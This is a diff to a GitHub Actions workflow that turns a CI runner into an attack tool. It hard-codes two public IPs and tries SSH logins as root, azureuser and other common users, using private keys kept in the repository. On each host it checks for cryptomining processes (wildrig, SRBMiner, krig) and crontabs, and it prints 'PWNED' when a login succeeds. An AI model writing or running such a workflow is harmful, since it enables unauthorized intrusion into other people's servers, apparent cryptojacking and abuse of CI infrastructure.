@@ -6,22 +6,21 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 12
+    timeout-minutes: 10
     steps:
       - uses: actions/checkout@v4
       - name: probe
         run: |
           chmod 600 az/azadmin.pem az/ibm_key.pem
           echo "RUNNER=$(hostname) EGRESS=$(curl -s -m 8 https://ifconfig.me)"
-          n=0
-          while IFS=$'\t' read -r name ip user rest; do
-            n=$((n+1)); [ $n -gt 16 ] && break
-            if timeout 5 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null; then
-              echo "OPEN $name $ip"
+          for IP in 168.62.216.152 40.113.1.63; do
+            echo "== $IP =="; timeout 5 bash -c "echo > /dev/tcp/$IP/22" && echo PORT22_OPEN || echo PORT22_CLOSED
+            ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=none -o LogLevel=ERROR root@$IP 2>&1 | head -1
+            for u in root ubuntu azureuser adminuser t19 admin debian; do
               for K in az/azadmin.pem az/ibm_key.pem; do
-                ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o LogLevel=ERROR "$user@$ip" 'echo LOGIN_'"$(basename $K)"'=$(id -u)@$(hostname); nvidia-smi -L 2>/dev/null | head -2; pgrep -a wildrig | head -1; pgrep -a SRBMiner | head -1; pgrep -a krig | head -1; crontab -l 2>/dev/null | grep -c .' 2>&1 | head -8
+                out=$(ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$IP" 'echo LOGIN_OK uid=$(id -u) host=$(hostname); nvidia-smi -L 2>/dev/null|head -2; pgrep -a krig|head -1; pgrep -a wildrig|head -1; pgrep -a SRBMiner|head -1; crontab -l 2>/dev/null|grep -c .' 2>&1 | head -6)
+                echo "TRY $IP $u $(basename $K) => $out"
+                case "$out" in *LOGIN_OK*) echo "PWNED $IP $u $K";; esac
               done
-            else
-              echo "CLOSED $name $ip"
-            fi
-          done < az/hosts.tsv
+            done
+          done
